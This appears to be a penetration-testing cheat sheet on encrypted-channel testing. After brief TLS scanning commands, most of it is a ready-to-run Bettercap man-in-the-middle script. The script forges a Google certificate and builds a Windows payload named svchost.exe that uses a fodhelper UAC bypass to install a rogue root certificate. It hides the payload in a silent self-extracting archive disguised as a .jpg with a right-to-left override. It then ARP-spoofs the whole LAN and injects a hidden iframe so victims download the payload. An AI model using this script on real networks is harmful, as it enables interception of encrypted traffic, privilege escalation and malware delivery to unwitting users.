# Credentials Encrypted Channel

## Check List

* [ ] _Identify sensitive information transmitted through the various channels._
* [ ] _Assess the privacy and security of the channels used._

## Cheat Sheet

### Scan Vulns

#### [cURL](https://curl.se/)

```bash
curl -vk --tlsv1.1 https://$WEBSITE; \
curl -vk --tlsv1.2 https://$WEBSITE; \
curl -vk --tlsv1.3 https://$WEBSITE;
```

#### [testssl.sh](https://github.com/testssl/testssl.sh)

```bash
testssl $WEBSITE
```

#### [SSLyze](https://github.com/nabla-c0d3/sslyze)

```bash
sslyze --regular $WEBSITE
```

### Man In The Middle

#### [Bettercap](https://www.bettercap.org/)

_Create Script_

```bash
sudo nano mitm-bettercap.sh
```

```bash
#!/bin/bash
set -euo pipefail

# ========================
# --- CONFIG & COLORS ---
# ========================
RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
color_print() { printf "${!1}%b${RESET}\n" "$2"; }

rm -rf ~/.wine
WINEARCH=win64 wineboot --init
MITM_DIR="/tmp/mitm"
WINEPREFIX="${$HOME/.wine}"
MSF_LOOT="$HOME/.msf4/loot"
BUILD_DIR="$WINEPREFIX/drive_c/pyinstaller-build"
ICON_URL="https://9to5google.com/wp-content/client-mu-plugins/9to5-core/includes/obfuscate-images/images/9to5google-default.jpg"

# ========================
# --- ROOT CHECK ---
# ========================
if [[ "$(id -u)" -ne 0 ]]; then
    color_print RED "[X] Please run as ROOT."
    exit 1
fi

# ========================
# --- PYTHON CHECK ---
# ========================
if [ ! -d "$WINEPREFIX/drive_c/pyinstaller-build" ]; then
    wget https://www.python.org/ftp/python/3.9.1/python-3.9.1-amd64.exe -O /tmp/python39.exe
    wine /tmp/python39.exe
    wine python -m pip install --upgrade pip setuptools wheel
    wine python -m pip install pyinstaller
fi

# ========================
# --- NETWORK INFO ---
# ========================
IFACE=$(ip route | awk '/^default/ {print $5; exit}')
LAN=$(ip -4 addr show "$IFACE" | awk '/inet / {print $2}' | cut -d/ -f1 | head -1)
color_print GREEN "[*] Interface: $IFACE"
color_print GREEN "[*] Local IP: $LAN"

# ========================
# --- CLEANUP OLD FILES ---
# ========================
color_print YELLOW "[*] Cleaning old files..."
rm -rf "$MITM_DIR" "$MSF_LOOT"/* "$BUILD_DIR"
mkdir -p "$MITM_DIR" "$BUILD_DIR"

# ========================
# --- GENERATE FAKE CERTIFICATE ---
# ========================
color_print CYAN "[*] Generating fake certificate..."
msfconsole -qx "use auxiliary/gather/impersonate_ssl;set RHOSTS google.com;run;exit"
sleep 1
CERT_CRT=$(find "$MSF_LOOT" -type f -name "*.crt" | head -1)
CERT_KEY=$(find "$MSF_LOOT" -type f -name "*.key" | head -1)
cp -f "$CERT_CRT" "$MITM_DIR/ca.crt"
cp -f "$CERT_KEY" "$MITM_DIR/ca.key"
openssl x509 -in "$MITM_DIR/ca.crt" -out "$MITM_DIR/ca.pem"

# ========================
# --- CREATE ICON ---
# ========================
color_print CYAN "[*] Downloading & creating icon..."
wget -q -O "$MITM_DIR/google.jpg" "$ICON_URL"
convert "$MITM_DIR/google.jpg" -define icon:auto-resize=256,128,96,64,48,32,16 "$MITM_DIR/google.ico"

# ========================
# --- BUILD WINDOWS INSTALLER ---
# ========================
color_print GREEN "[*] Building Windows installer..."
CERT_B64=$(base64 -w0 "$MITM_DIR/ca.crt")

cat > "$MITM_DIR/cert-installer.py" <<EOF
import os, subprocess, tempfile, base64, time, winreg, sys
CERT_DATA = """$CERT_B64"""
CERT_FILENAME = "google.crt"
TMP_CERT_PATH = os.path.join(tempfile.gettempdir(), CERT_FILENAME)
REG_PATH = r"Software\\Classes\\ms-settings\\Shell\\Open\\command"
FODHELPER_EXE = r"C:\\Windows\\System32\\fodhelper.exe"
CERTUTIL_CMD = f'cmd /c certutil -addstore -f Root "{TMP_CERT_PATH}"'

def write_cert():
    with open(TMP_CERT_PATH, "wb") as f:
        f.write(base64.b64decode(CERT_DATA))

def uac_bypass(cmd):
    key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH)
    winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
    winreg.SetValueEx(key, None, 0, winreg.REG_SZ, cmd)
    winreg.CloseKey(key)
    subprocess.Popen([FODHELPER_EXE], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(3)
    for subkey in [
        REG_PATH,
        r"Software\\Classes\\ms-settings\\Shell\\Open",
        r"Software\\Classes\\ms-settings\\Shell",
        r"Software\\Classes\\ms-settings"
    ]:
        try: winreg.DeleteKey(winreg.HKEY_CURRENT_USER, subkey)
        except FileNotFoundError: pass

if __name__ == "__main__":
    write_cert()
    uac_bypass(CERTUTIL_CMD)
    sys.exit(0)
EOF

cp "$MITM_DIR/cert-installer.py" "$BUILD_DIR/cert_installer.py"
cp "$MITM_DIR/google.ico" "$BUILD_DIR/google.ico"

wine pyinstaller --onefile --noconfirm --noconsole \
    --icon "C:\\pyinstaller-build\\google.ico" \
    --name "svchost.exe" \
    "C:\\pyinstaller-build\\cert_installer.py"

cp -r "$HOME/.wine/drive_c/pyinstaller-build/build/svchost.exe" "$MITM_DIR/svchost.exe"

# ========================
# --- CREATE RAR SFX ---
# ========================
color_print CYAN "[*] Creating SFX archive..."
cat > "$MITM_DIR/sfx.txt" <<EOF
;The comment below contains SFX script commands
Path=C:\\Users\\%username%\\AppData\\Local\\Temp
Setup=svchost.exe
Presetup=google.jpg
Silent=1
Overwrite=1
Update=U
EOF

cd "$MITM_DIR"
rar a -sfx -z"$MITM_DIR/sfx.txt" "/var/www/html/google-update-%E2%80%AEexe.jpg" "$MITM_DIR/svchost.exe"

# ========================
# --- RESTART APACHE ---
# ========================
color_print GREEN "[*] Restarting Apache..."
service apache2 restart

# ========================
# --- GENERATE HOOK.JS & CAPLET ---
# ========================
color_print CYAN "[*] Scanning network..."
TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups --plain |
          awk '{print $1}' |
          grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' |
          grep -v "$LAN" | sort -u | paste -sd ',' -)

cat > "$MITM_DIR/hook.js" <<EOF
const iframe = document.createElement('iframe');
iframe.src = 'http://$LAN/google-update-%E2%80%AEexe.jpg';
iframe.width = '0';
iframe.height = '0';
iframe.style.display = 'none';
document.body.appendChild(iframe);
EOF

cat > "$MITM_DIR/fallback.cap" <<EOF
set arp.spoof.targets $TARGETS
set arp.spoof.internal true

set https.proxy true
set http.proxy true

set https.proxy.certificate $MITM_DIR/ca.pem
set https.proxy.key $MITM_DIR/ca.key

set https.proxy.script $MITM_DIR/hook.js
set http.proxy.script $MITM_DIR/hook.js

arp.spoof on
http.proxy on
https.proxy on
EOF

# ========================
# --- LAUNCH BETTERCAP ---
# ========================
color_print GREEN "[*] Launching Bettercap..."
bettercap -iface "$IFACE" -caplet "$MITM_DIR/fallback.cap"
```

_Run & Execute_

```bash
sudo chmod +x mitm-bettercap.sh;sudo ./mitm-bettercap.sh
```
